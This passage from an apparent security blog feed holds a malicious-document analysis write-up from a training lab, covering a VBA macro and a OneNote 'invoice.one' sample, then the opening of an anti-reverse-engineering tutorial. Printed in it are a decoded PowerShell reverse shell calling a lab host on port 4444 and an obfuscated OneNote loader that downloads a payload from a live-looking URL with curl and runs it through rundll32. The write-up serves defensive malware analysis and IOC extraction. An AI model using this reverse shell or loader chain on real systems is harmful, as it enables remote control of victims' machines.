ERROR    Running export_all_excel_sheets.py failed. Command <span class="s1">'['</span>python3<span class="s1">', '</span>/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py<span class="s1">', '</span>/tmp/tmp_excel_file_1428744234<span class="s1">']'</span> returned non-zero <span class="nb">exit </span>status 1
ERROR    Reading <span class="k">in </span>file as Excel with xlrd failed. Can<span class="s1">'t find workbook in OLE2 compound document
INFO     Saving dropped analysis artifacts in .//suspicious.doc_artifacts/
INFO     Parsing VB...
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file:  - OLE stream: u'</span>Macros/VBA/ThisDocument<span class="s1">'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file:  - OLE stream: u'</span>Macros/VBA/NewMacros<span class="s1">'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-------------------------------------------------------------------------------
VBA CODE (with long lines collapsed):
Sub AutoOpen()
        AutoOpenMacro
End Sub
...
</span></code></pre></div></div> <p>Where we used to perform static analysis and extraction, <em>Vipermonkey</em> now enables dynamic analysis by executing the embedded macro in an isolated environment to extract IOCs and other valuable information.</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TRACING VBA CODE (entrypoint = Auto*):
INFO     Found possible intermediate IOC (URL): 'http://schemas.openxmlformats.org/drawingml/2006/main'
INFO     Emulating loose statements...
INFO     ACTION: Found Entry Point - params 'autoopen' - 
INFO     evaluating Sub AutoOpen
INFO     Calling Procedure: AutoOpenMacro('[]')
INFO     evaluating Sub AutoOpenMacro
INFO     Found possible intermediate IOC (base64): 'powershell.exe -nop -w hidden -e bGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoImh ...'
INFO     calling Function: CreateObject('Wscript.Shell')
INFO     ACTION: CreateObject - params ['Wscript.Shell'] - Interesting Function Call
INFO     calling Function: Run('powershell.exe -nop -w hidden -e bGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2...)
...

Recorded Actions:
+-------------------+---------------------------+---------------------------+
| Action            | Parameters                | Description               |
+-------------------+---------------------------+---------------------------+
| Found Entry Point | autoopen                  |                           |
| CreateObject      | ['Wscript.Shell']         | Interesting Function Call |
| Run               | ['powershell.exe -nop -w  | Interesting Function Call |
|                   | hidden -e bGllbnQgPSBOZXc |                           |
|                   | tT2JqZWN0IFN5c3RlbS5OZXQu |    
...

</code></pre></div></div> <p>As a result, we get a false positive URL and an interesting base64 encoded string. Using tools like <em>Cyberchef</em> or <code class="language-plaintext highlighter-rouge">base64 -d</code>, we are able to get the actual powershell code.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TCPClient</span><span class="p">(</span><span class="s2">"http://thmredteam.thm/stage2.exe"</span><span class="p">,</span><span class="mi">4444</span><span class="p">);</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">();[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">65535</span><span class="o">|%</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="kr">while</span><span class="p">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$bytes</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="nx">0</span><span class="p">){;</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">System.Text.ASCIIEncoding</span><span class="p">)</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">iex</span><span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="o">&amp;</span><span class="nx">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-String</span><span class="w"> </span><span class="p">);</span><span class="nv">$sendback2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$sendback</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"PS "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span><span class="o">.</span><span class="nf">Path</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"&gt; "</span><span class="p">;</span><span class="nv">$sendbyte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">)</span><span class="o">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
</span></code></pre></div></div> <p>The base64 decoded string result clearly shows the Powershell code. It is evident that the document would try to connect to the C2 server on port <em>4444</em> to download the malware called <em>stage2</em>.</p> <pre><code class="language-url">http://thmredteam.thm/stage2.exe
</code></pre> <p>Finally, we have found the IOC, which is a C2 server. From a SOC analyst’s perspective, we will move on creating a detection rule on outbound traffic to detect if any host has communicated to this C2 server in the past or in the future. If any communication is observed, it means the host have been comprmised and needs immediate remedy.</p> <h3 id="questions-2">Questions</h3> <p><strong>What is the author name of the document found during the analysis?</strong></p> <p>This question can be answered with <code class="language-plaintext highlighter-rouge">olemeta</code>/<code class="language-plaintext highlighter-rouge">oledump</code>.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">CMNatic</code></em></p> <p><strong>How many macros are embedded in the document?</strong></p> <p>This question can be answered with <code class="language-plaintext highlighter-rouge">olevba</code>/<code class="language-plaintext highlighter-rouge">oledump</code>.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>What is the URL extracted from the suspicious.doc file?</strong></p> <p>Using <em>Cyberchef</em> with <em>From Base64 -&gt; Extract URLs</em>:</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">http://thmredteam.thm/stage2.exe</code></em></p> <h2 id="task-9---onenote">Task 9 - OneNote</h2> <p>OneNote is a popular note-taking and collaboration tool developed by Microsoft. It allows users to create and organize digital notebooks containing various types of content, such as text, images, audio … OneNote files are saved with a <em>.one</em> or <em>.onenote</em> extension.</p> <p>Recently, different APT groups have started utilizing OneNote document in their recent campaigns. In <a href="https://bazaar.abuse.ch/browse.php?search=file_type%3Aone">MalwareBazaar</a>, it is possible to retrieve plenty of rogue notes.</p> <figure> <picture> <img src="/assets/img/images/thm_maldoc_static_analysis/H16m2AQxyg.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="MalwareVazaar OneNote Documents" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>We will be using one of the documents from the above list to practice analyzing and see if we can extract some ofuscated code or IOCs.</p> <p>Within the provided lab, we will be using the <code class="language-plaintext highlighter-rouge">invoice.one</code> document.</p> <h3 id="analyzing-the-document">Analyzing the document</h3> <p>We will use <code class="language-plaintext highlighter-rouge">trid</code> for file identification. It is indeed a OneNote document.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/onenoteDocs<span class="nv">$ </span>trid invoice.one 

TrID/32 - File Identifier v2.24 - <span class="o">(</span>C<span class="o">)</span> 2003-16 By M.Pontello
Definitions found:  13206
Analyzing...

Collecting data from file: invoice.one
100.0% <span class="o">(</span>.ONE<span class="o">)</span> Microsoft OneNote note <span class="o">(</span>16008/2<span class="o">)</span>
</code></pre></div></div> <p>Firstly, we take out strings to see if there is anything interesting in the file like <em>IP addresses, scripts, domains</em>…</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/onenoteDocs<span class="nv">$ </span>strings invoice.one <span class="nt">-n</span> 20
Copyright <span class="o">(</span>c<span class="o">)</span> 1998 Hewlett-Packard Company
IEC http://www.iec.ch
IEC http://www.iec.ch
.IEC 61966-2.1 Default RGB colour space - sRGB
.IEC 61966-2.1 Default RGB colour space - sRGB
,Reference Viewing Condition <span class="k">in </span>IEC61966-2.1
,Reference Viewing Condition <span class="k">in </span>IEC61966-2.1
Copyright <span class="o">(</span>c<span class="o">)</span> 1998 Hewlett-Packard Company
IEC http://www.iec.ch
IEC http://www.iec.ch
.IEC 61966-2.1 Default RGB colour space - sRGB
.IEC 61966-2.1 Default RGB colour space - sRGB
,Reference Viewing Condition <span class="k">in </span>IEC61966-2.1
,Reference Viewing Condition <span class="k">in </span>IEC61966-2.1
&lt;div <span class="nb">id</span><span class="o">=</span><span class="s2">"content"</span><span class="o">&gt;</span>f5&amp;u5&amp;n5&amp;c5&amp;t5&amp;i5&amp;o5&amp;n5&amp; 5&amp;s5&amp;l5&amp;e5&amp;e5&amp;p5&amp;<span class="o">(</span>5&amp;m5&amp;i5&amp;l5&amp;l5&amp;i5&amp;s5&amp;<span class="o">)</span>5&amp;<span class="o">{</span>5&amp;v5&amp;a5&amp;r5&amp; 5&amp;d5&amp;a5&amp;t5&amp;e5&amp; 5&amp;<span class="o">=</span>5&amp; 5&amp;n5&amp;e5&amp;w5&amp; 5&amp;D5&amp;a5&amp;t5&amp;e5&amp;<span class="o">(</span>5&amp;<span class="o">)</span>5&amp;<span class="p">;</span>5&amp;v5&amp;a5&amp;r5&amp; 5&amp;c5&amp;u5&amp;r5&amp;D5&amp;a5&amp;t5&amp;e5&amp; 5&amp;<span class="o">=</span>5&amp; 5&amp;n5&amp;u5&amp;l5&amp;l5&amp;<span class="p">;</span>5&amp;d5&amp;o5&amp; 5&amp;<span class="o">{</span>5&amp; 5&amp;c5&amp;u5&amp;r5&amp;D5&amp;a5&amp;t5&amp;e5&amp; 5&amp;<span class="o">=</span>5&amp; 5&amp;n5&amp;e5&amp;w5&amp; 5&amp;D5&amp;a5&amp;t5&amp;e5&amp;<span class="o">(</span>5&amp;<span class="o">)</span>5&amp;<span class="p">;</span>5&amp; 5&amp;<span class="o">}</span>5&amp;w5&amp;h5&amp;i5&amp;l5&amp;e5&amp;
...
&lt;script <span class="nv">language</span><span class="o">=</span><span class="s2">"javascript"</span><span class="o">&gt;</span>
var hello <span class="o">=</span> <span class="s2">"39cd7b469beae7c617c73e0d008195ef"</span><span class="p">;</span>
var content <span class="o">=</span> document.getElementById<span class="o">(</span><span class="s2">"content"</span><span class="o">)</span>.innerText<span class="p">;</span>
&lt;script <span class="nv">language</span><span class="o">=</span><span class="s2">"vbscript"</span><span class="o">&gt;</span>
Dim ws : Set ws <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">"WScript.Shell"</span><span class="o">)</span>
ws.RegWrite <span class="s2">"HKCU</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\A</span><span class="s2">ndromedia</span><span class="se">\M</span><span class="s2">p4ToAvi</span><span class="se">\V</span><span class="s2">alues"</span>, content, <span class="s2">"REG_SZ"</span>
<span class="s1">' msgbox ws.RegRead("HKCU\SOFTWARE\Andromedia\Mp4ToAvi\Values")
&lt;script language="javascript"&gt;
var body = ws.RegRead("HKCU\\SOFTWARE\\Andromedia\\Mp4ToAvi\\Values");
var func = Function("url", body.replace(/5&amp;/g, ""));
func("https://unitedmedicalspecialties.com/T1Gpp/OI.png");
&lt;script language="vbscript"&gt;
ws.RegDelete("HKCU\SOFTWARE\Andromedia\Mp4ToAvi\Values")
&lt;html&gt;&lt;head&gt;&lt;script language="vbscript"&gt;
Sub PsIfYCwsFUxaTzhDcniBNSKKlpFvBQkq(fVyZuxSyFixqmNzeEtgoYpnLGIiLoMtQAkqFX) : eval("execute(fVyZuxSyFixqmNzeEtgoYpnLGIiLoMtQAkqFX)") : End Sub
...
</span></code></pre></div></div> <p>Because it looks like we are getting some references to some suspicious code, we will use another utility called <code class="language-plaintext highlighter-rouge">onedump.py</code>.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/onenoteDocs<span class="nv">$ </span>python3 onedump.py invoice.one 
File: invoice.one
 1: 0x00001740 .... ffd8ffe2 0x00015b4f 4d5f7afd30851031376da0fa6d0e3f80
 2: 0x0001d290 .... ffd8ffe2 0x0000d36f 2ccb7fd40e61b6dd2cd936e61929fb81
 3: 0x0002ae58 .PNG 89504e47 0x000000ef 088833d5a4fdcd105a34657922326f76
 4: 0x0002bb00 .PNG 89504e47 0x00000128 33dca72504d567c57f95452a0358ed2f
 5: 0x0002bc60 &lt;htm 3c68746d 0x00000817 c9d2355fc2be90b0fa73ecb67061a77e
 6: 0x0002d628 &lt;htm 3c68746d 0x00005c19 b915056524f1b25937074727cdf5f87c
</code></pre></div></div> <p>Subsequently, we get two interesting objects which seem to have HTML files. We shall use <code class="language-plaintext highlighter-rouge">-s X</code>, which <em>X</em> is the object number, to search for the <em>X</em> object and the <code class="language-plaintext highlighter-rouge">-d</code> flag to dump it on the screen.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/onenoteDocs<span class="nv">$ </span>python3 onedump.py <span class="nt">-s</span> 5 <span class="nt">-d</span> invoice.one 
&lt;html&gt;

&lt;div <span class="nb">id</span><span class="o">=</span><span class="s2">"content"</span><span class="o">&gt;</span>f5&amp;u5&amp;n5&amp;c5&amp;t5&amp;i5&amp;o5&amp;n5&amp; 5&amp;s5&amp;l5&amp;e5&amp;e5&amp;p5&amp;<span class="o">(</span>5&amp;m5&amp;i5&amp;l5&amp;l5&amp;i5&amp;s5&amp;<span class="o">)</span>5&amp;<span class="o">{</span>5&amp;v5&amp;a5&amp;r5&amp; 5&amp;d5&amp;a5&amp;t5&amp;e5&amp; 5&amp;<span class="o">=</span>5&amp; 5&amp;n5&amp;e5&amp;w5&amp; 5&amp;D5&amp;a5&amp;t5&amp;e5&amp;<span class="o">(</span>5&amp;<span class="o">)</span>5&amp;<span class="p">;</span>5&amp;v5&amp;a5&amp;r5&amp; 5&amp;c5&amp;u5&amp;r5&amp;D5&amp;a5&amp;t5&amp;e5&amp; 5&amp;<span class="o">=</span>5&amp; 5&amp;n5&amp;u5&amp;l5&amp;l5&amp;<span class="p">;</span>5&amp;d5&amp;o5&amp; 5&amp;<span class="o">{</span>5&amp; 5&amp;c5&amp;u5&amp;r5&amp;D5&amp;a5&amp;t5&amp;e5&amp; 5&amp;<span class="o">=</span>5&amp; 5&amp;n5&amp;e5&amp;w5&amp; 5&amp;D5&amp;a5&amp;t5&amp;e5&amp;<span class="o">(</span>5&amp;<span class="o">)</span>5&amp;<span class="p">;</span>5&amp; 5&amp;<span class="o">}</span>5&amp;w5&amp;h5&amp;i5&amp;l5&amp;e5&amp;<span class="o">(</span>5&amp;c5&amp;u5&amp;r5&amp;D5&amp;a5&amp;t5&amp;e5&amp; 5&amp;-5&amp; 5&amp;d5&amp;a5&amp;t5&amp;e5&amp; 5&amp;&lt;5&amp; 5&amp;m5&amp;i5&amp;l5&amp;l5&amp;i5&amp;s5&amp;<span class="o">)</span>5&amp;<span class="p">;</span>5&amp;<span class="o">}</span>5&amp;/5&amp;<span class="k">*</span>5&amp;<span class="k">*</span>5&amp; 5&amp;v5&amp;a5&amp;r5&amp; 5&amp;u5&amp;r5&amp;l5&amp; 5&amp;<span class="o">=</span>5&amp; 5&amp;<span class="s2">"5&amp;h5&amp;t5&amp;t5&amp;p5&amp;s5&amp;:5&amp;/5&amp;/5&amp;g5&amp;o5&amp;o5&amp;g5&amp;l5&amp;e5&amp;.5&amp;c5&amp;o5&amp;m5&amp;"</span>5&amp;<span class="p">;</span>5&amp; 5&amp;<span class="k">*</span>5&amp;/5&amp;n5&amp;e5&amp;w5&amp; 5&amp;A5&amp;c5&amp;t5&amp;i5&amp;v5&amp;e5&amp;X5&amp;O5&amp;b5&amp;j5&amp;e5&amp;c5&amp;t5&amp;<span class="o">(</span>5&amp;<span class="s2">"5&amp;w5&amp;s5&amp;c5&amp;r5&amp;i5&amp;p5&amp;t5&amp;.5&amp;s5&amp;h5&amp;e5&amp;l5&amp;l5&amp;"</span>5&amp;<span class="o">)</span>5&amp;.5&amp;r5&amp;u5&amp;n5&amp;<span class="o">(</span>5&amp;<span class="s2">"5&amp;c5&amp;u5&amp;r5&amp;l5&amp;.5&amp;e5&amp;x5&amp;e5&amp; 5&amp;-5&amp;-5&amp;o5&amp;u5&amp;t5&amp;p5&amp;u5&amp;t5&amp; 5&amp;C5&amp;:5&amp;</span><span class="se">\5</span><span class="s2">&amp;</span><span class="se">\5</span><span class="s2">&amp;P5&amp;r5&amp;o5&amp;g5&amp;r5&amp;a5&amp;m5&amp;D5&amp;a5&amp;t5&amp;a5&amp;</span><span class="se">\5</span><span class="s2">&amp;</span><span class="se">\5</span><span class="s2">&amp;i5&amp;n5&amp;d5&amp;e5&amp;x5&amp;15&amp;.5&amp;p5&amp;n5&amp;g5&amp; 5&amp;-5&amp;-5&amp;u5&amp;r5&amp;l5&amp; 5&amp;"</span>5&amp; 5&amp;+5&amp; 5&amp;u5&amp;r5&amp;l5&amp;,5&amp; 5&amp;05&amp;<span class="o">)</span>5&amp;<span class="p">;</span>5&amp;s5&amp;l5&amp;e5&amp;e5&amp;p5&amp;<span class="o">(</span>5&amp;15&amp;55&amp;05&amp;05&amp;05&amp;<span class="o">)</span>5&amp;<span class="p">;</span>5&amp;v5&amp;a5&amp;r5&amp; 5&amp;s5&amp;h5&amp;e5&amp;l5&amp;l5&amp; 5&amp;<span class="o">=</span>5&amp; 5&amp;n5&amp;e5&amp;w5&amp; 5&amp;A5&amp;c5&amp;t5&amp;i5&amp;v5&amp;e5&amp;X5&amp;O5&amp;b5&amp;j5&amp;e5&amp;c5&amp;t5&amp;<span class="o">(</span>5&amp;<span class="s2">"5&amp;s5&amp;h5&amp;e5&amp;l5&amp;l5&amp;.5&amp;a5&amp;p5&amp;p5&amp;l5&amp;i5&amp;c5&amp;a5&amp;t5&amp;i5&amp;o5&amp;n5&amp;"</span>5&amp;<span class="o">)</span>5&amp;<span class="p">;</span>5&amp;s5&amp;h5&amp;e5&amp;l5&amp;l5&amp;.5&amp;s5&amp;h5&amp;e5&amp;l5&amp;l5&amp;e5&amp;x5&amp;e5&amp;c5&amp;u5&amp;t5&amp;e5&amp;<span class="o">(</span>5&amp;<span class="s2">"5&amp;r5&amp;u5&amp;n5&amp;d5&amp;l5&amp;l5&amp;35&amp;25&amp;"</span>5&amp;,5&amp; 5&amp;<span class="s2">"5&amp;C5&amp;:5&amp;</span><span class="se">\5</span><span class="s2">&amp;</span><span class="se">\5</span><span class="s2">&amp;P5&amp;r5&amp;o5&amp;g5&amp;r5&amp;a5&amp;m5&amp;D5&amp;a5&amp;t5&amp;a5&amp;</span><span class="se">\5</span><span class="s2">&amp;</span><span class="se">\5</span><span class="s2">&amp;i5&amp;n5&amp;d5&amp;e5&amp;x5&amp;15&amp;.5&amp;p5&amp;n5&amp;g5&amp;,5&amp;W5&amp;i5&amp;n5&amp;d5&amp;"</span>5&amp;,5&amp; 5&amp;<span class="s2">"5&amp;"</span>5&amp;,5&amp; 5&amp;<span class="s2">"5&amp;o5&amp;p5&amp;e5&amp;n5&amp;"</span>5&amp;,5&amp; 5&amp;35&amp;<span class="o">)</span>5&amp;<span class="p">;</span>5&amp;&lt;/div&gt;

&lt;script <span class="nv">language</span><span class="o">=</span><span class="s2">"javascript"</span><span class="o">&gt;</span>

var hello <span class="o">=</span> <span class="s2">"39cd7b469beae7c617c73e0d008195ef"</span><span class="p">;</span>

var content <span class="o">=</span> document.getElementById<span class="o">(</span><span class="s2">"content"</span><span class="o">)</span>.innerText<span class="p">;</span>

&lt;/script&gt;

&lt;script <span class="nv">language</span><span class="o">=</span><span class="s2">"vbscript"</span><span class="o">&gt;</span>

Dim ws : Set ws <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">"WScript.Shell"</span><span class="o">)</span>

<span class="s1">' Write reg
ws.RegWrite "HKCU\SOFTWARE\Andromedia\Mp4ToAvi\Values", content, "REG_SZ"

'</span> msgbox ws.RegRead<span class="o">(</span><span class="s2">"HKCU</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\A</span><span class="s2">ndromedia</span><span class="se">\M</span><span class="s2">p4ToAvi</span><span class="se">\V</span><span class="s2">alues"</span><span class="o">)</span>

&lt;/script&gt;

&lt;script <span class="nv">language</span><span class="o">=</span><span class="s2">"javascript"</span><span class="o">&gt;</span>

var body <span class="o">=</span> ws.RegRead<span class="o">(</span><span class="s2">"HKCU</span><span class="se">\\</span><span class="s2">SOFTWARE</span><span class="se">\\</span><span class="s2">Andromedia</span><span class="se">\\</span><span class="s2">Mp4ToAvi</span><span class="se">\\</span><span class="s2">Values"</span><span class="o">)</span><span class="p">;</span>

var func <span class="o">=</span> Function<span class="o">(</span><span class="s2">"url"</span>, body.replace<span class="o">(</span>/5&amp;/g, <span class="s2">""</span><span class="o">))</span><span class="p">;</span>
func<span class="o">(</span><span class="s2">"https://unitedmedicalspecialties.com/T1Gpp/OI.png"</span><span class="o">)</span><span class="p">;</span>

&lt;/script&gt;

&lt;script <span class="nv">language</span><span class="o">=</span><span class="s2">"vbscript"</span><span class="o">&gt;</span>

ws.RegDelete<span class="o">(</span><span class="s2">"HKCU</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\A</span><span class="s2">ndromedia</span><span class="se">\M</span><span class="s2">p4ToAvi</span><span class="se">\V</span><span class="s2">alues"</span><span class="o">)</span>

<span class="s1">' Close window
window.close

&lt;/script&gt;

&lt;/html&gt;
</span></code></pre></div></div> <p>This file looks like HTML code containing obfuscated Javascript and VBScript. We will save it using <code class="language-plaintext highlighter-rouge">python3 onedump.py -s 5 -d invoice.one &gt; obj5</code> and open it in notepad.</p> <figure> <picture> <img src="/assets/img/images/thm_maldoc_static_analysis/SyA0QkEg1g.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="OneNote obfuscated code" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>This extraction results in some interesting obfuscated code. The javascript part clearly uses a <em>replace</em> function to remove <code class="language-plaintext highlighter-rouge">5&amp;</code> from the string.</p> <figure> <picture> <img src="/assets/img/images/thm_maldoc_static_analysis/rJw5Nk4e1l.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="OneNote deobfuscated code" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Now, the code makes more sense and contains some important IOCs. To sum up the findings:</p> <ul> <li>The OneNote document contains <strong>two suspicious HTML</strong> objects.</li> <li>This script contains <strong>obfuscated code</strong>, which is cleared out by removing <code class="language-plaintext highlighter-rouge">5&amp;</code>.</li> <li>The script <strong>writes the deobfuscated script to the registry</strong> <code class="language-plaintext highlighter-rouge">HKCU\\SOFTWARE\\Andromedia\\Mp4ToAvi\\Values</code>.</li> <li><strong>Runs the script</strong>.</li> <li><strong>C2 domain</strong> is <code class="language-plaintext highlighter-rouge">hxxps[:]//unitedmedicalspecialties[.]com/T1Gpp/OI.png</code>.</li> <li>It <strong>downloads the payload</strong> using <em>cURL</em> and outputs the payload into <em>index1.png</em> with <code class="language-plaintext highlighter-rouge">curl.exe --output C:\\\\ProgramData\\\\index1.png --url " + url, 0);</code>.</li> <li><strong>Sleeps for 15 seconds</strong> using <code class="language-plaintext highlighter-rouge">sleep(15000)</code>.</li> <li><strong>Runs the payload</strong> using <em>rundll32</em> -&gt; <code class="language-plaintext highlighter-rouge">shell.shellexecute("rundll32", "C:\\ProgramData\\index1.png,Wind", "", "open", 3);</code>.</li> <li><strong>Deletes the registry entry</strong>.</li> </ul> <h3 id="questions-3">Questions</h3> <p><strong>What is the value used in the sleep function?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">15000</code></em></p> <p><strong>The cURL command is being used to download from a URL and saving the payload in a png file. What is that file name?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">index1.png</code></em></p> <p><strong>How many objects are found in the <em>invoice.one</em> document?</strong></p> <p>It is known by checking how many objects are listed in <code class="language-plaintext highlighter-rouge">onedump.py</code>.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">6</code></em></p> <h2 id="task-10---conclusion">Task 10 - Conclusion</h2> <p>In conclusion, we have examined various document file types and explored how they can be weaponized in cyberattacks. Our focus was primarily on the PDF format, where we learned to perform static analysis by inspecting obfuscated JavaScript. We also explored 97-2003 Word documents, extracting Indicators of Compromise (IOCs) from VBA macros, and analyzed OneNote files, particularly those containing HTML embedded objects with obfuscated JavaScript and VBS code.</p> <p>Future modules will delve into more advanced topics, such as dynamic document analysis and deobfuscating scripts like PowerShell, JavaScript, and VBScript.</p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="Malware Analysis"/><category term="RE"/><category term="Static Analysis"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM Anti-Reverse Engineering</title><link href="https://nonohm.github.io/blog/2024/THM-Anti-Reverse-Engineering/" rel="alternate" type="text/html" title="THM Anti-Reverse Engineering"/><published>2024-09-18T18:49:45+00:00</published><updated>2024-09-18T18:49:45+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-Anti-Reverse-Engineering</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-Anti-Reverse-Engineering/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>To start with, malware authors are constantly looking to improve their malware by implementing new ways of evading detection. On the other hand, analysts are working on new methods to uncover these. This mouse and cat game lead to the development of increasingly sofisticated technique implementations and discover protocols.</p> <p>Reverse engineering is the process of studying a product, software or hardware, to understand how it works and extracting its functionalities and design. Here, in cybersecurity, RE (Reverse Engineering) is used on binaries to extract <a href="https://www.crowdstrike.com/cybersecurity-101/indicators-of-compromise/">Indicators of Compromise (IOC)</a> and develop adequate countermeasures.</p> <p>In this room, we will explore about some anti-reverse engineering techniques malware uses like:</p> <ul> <li>VM Detection</li> <li>Obfuscation using packers</li> <li>Anti-debugging</li> </ul> <h3 id="learning-objectives">Learning Objectives</h3> <ul> <li>Why malware authors use anti-reverse engineering techniques</li> <li>Learn about different anti-RE techniques</li> <li>How to circumvent these using various tools</li> <li>How they are implented by reading source code</li> </ul> <h3 id="prerequisties">Prerequisties</h3> <ul> <li>Familiarity with <a href="https://tryhackme.com/room/basicdynamicanalysis">Basic</a> / <a href="https://(https://tryhackme.com/room/advanceddynamicanalysis)">Advanced</a> Dynamic Analysis.</li> <li>Knowledge of <a href="https://tryhackme.com/room/x86assemblycrashcourse">assembly</a> (Registers, Stack, Operands…)</li> <li>Basic understating of C programming concepts</li> </ul> <h2 id="task-2---anti-debugging-overview">Task 2 - Anti-Debugging (Overview)</h2> <p>Debugging is the process of examining software in order to <strong>understand its inner workings</strong> and <strong>identify potential flaws and vulnerabilities</strong>. Consequently, this involves programs called debuggers, with most used ones nowadays are:</p> <ul> <li>X32/X64dbg</li> <li>Ollydbg</li> <li>IDA pro</li> <li>Ghidra</li> </ul> <p>Anti-debugging techniques used by malware authors are plentiful and below is a summary of many of them:</p> <table> <thead> <tr> <th><strong>Anti-Debugging Technique</strong></th> <th><strong>Explanation</strong></th> </tr> </thead> <tbody> <tr> <td><strong>API-Based Detection</strong></td> <td>Uses system APIs like <code class="language-plaintext highlighter-rouge">IsDebuggerPresent()</code> or <code class="language-plaintext highlighter-rouge">NtQueryInformationProcess()</code> to detect debuggers.</td> </tr> <tr> <td><strong>Timing Attacks</strong></td> <td>Measures execution time of instructions; delays indicate the presence of a debugger.</td> </tr> <tr> <td><strong>Breakpoint Detection</strong></td> <td>Scans for hardware and software breakpoints (e.g., <code class="language-plaintext highlighter-rouge">0xCC</code> opcode) set by debuggers.</td> </tr> <tr> <td><strong>Exception-Based Techniques</strong></td> <td>Exploits how debuggers handle exceptions (e.g., division by zero or single-step exceptions).</td> </tr> <tr> <td><strong>Self-Debugging</strong></td> <td>Malware debugs itself, preventing another debugger from attaching to the process.</td> </tr> <tr> <td><strong>PEB Manipulation</strong></td> <td>Checks <code class="language-plaintext highlighter-rouge">BeingDebugged</code> and <code class="language-plaintext highlighter-rouge">NtGlobalFlag</code> flags in the Process Environment Block for signs of debugging.</td> </tr> <tr> <td><strong>Anti-Attachment Techniques</strong></td> <td>Makes it difficult for debuggers to attach, often through process spawning or modifying debugger behavior.</td> </tr> <tr> <td><strong>Code Obfuscation</strong></td> <td>Obscures the code to prevent easy analysis, using opaque predicates, inline functions, or anti-disassembly.</td> </tr> <tr> 